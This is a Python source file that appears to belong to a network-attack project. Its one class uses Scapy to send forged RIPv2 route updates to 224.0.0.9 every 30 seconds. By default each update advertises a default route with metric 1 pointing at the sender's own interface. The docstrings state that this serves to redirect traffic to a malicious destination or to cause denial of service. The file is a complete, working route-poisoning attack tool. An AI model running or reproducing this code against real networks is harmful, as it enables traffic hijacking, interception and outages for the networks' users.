from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry
from utils.utils import create_logger
from threading import Thread
from typing import override
from yaml import safe_load
import logging
import time

class MalliciousRIPSender(Thread):
    DESTINATION_IP = "224.0.0.9"
    DESTINATION_PORT = 520
    DEFAULT_ADDRESS = "0.0.0.0"
    DEFAULT_MASK = "0.0.0.0"
    DEFAULT_METRIC = 1

    def __init__(self, configuration_path: str | None = None, logger: None | logging.Logger = None):
        super().__init__()
        self.logger = logger if logger else create_logger(self.__class__.__name__)
        self.config: dict = self.load_configuration(configuration_path)

    def load_configuration(self, configuration_path: str | None):
        """
        This method loads the configuration for the malicious RIP sender. The configuration can include the destination IP
        address, the subnet mask, and the metric for the route. For simplicity, we will use default values for these
        parameters in this implementation.
        """
        self.logger.debug("Loading configuration...")
        config = {}
        if configuration_path:
            with open(configuration_path, "r") as file:
                config = safe_load(file)

        return config

    def create_rip_packet(self):
        """
        This method creates a RIP packet with the malicious route. The route will have a very low metric, making it the
        preferred route for other routers in the network.
        """
        addr = self.config.get("addr", self.DEFAULT_ADDRESS)
        mask = self.config.get("mask", self.DEFAULT_MASK)
        metric = self.config.get("metric", self.DEFAULT_METRIC)
        iface_ip = get_if_addr(conf.iface)
        next_hop = self.config.get("nextHop", iface_ip)

        rip = RIP(cmd=2, version=2) / RIPEntry(
            addr=addr,
            mask=mask,
            nextHop=next_hop,
            metric=metric,
        )

        rip_packet = IP(dst=self.DESTINATION_IP) / UDP(sport=self.DESTINATION_PORT, dport=self.DESTINATION_PORT) / rip

        return rip_packet

    def send_malicious_rip_update(self):
        """
        This method sends a malicious RIP update to the network. The update contains a route to the destination IP
        address with a very low metric, making it the preferred route for other routers in the network. This can be
        used to redirect traffic to a malicious destination or to create a denial of service attack by advertising a
        non-existent route.
        """
        self.logger.debug("Sending fake RIP update...")

        rip_packet = self.create_rip_packet()

        send(rip_packet)

    def send_periodic_updates(self):
        """
        This method will be called when the thread starts. It will continuously send fake RIP updates every 30 seconds.
        """
        while True:
            self.send_malicious_rip_update()
            time.sleep(30)

    @override
    def run(self):
        self.logger.debug("Starting malicious RIP sender thread...")
        self.send_periodic_updates()
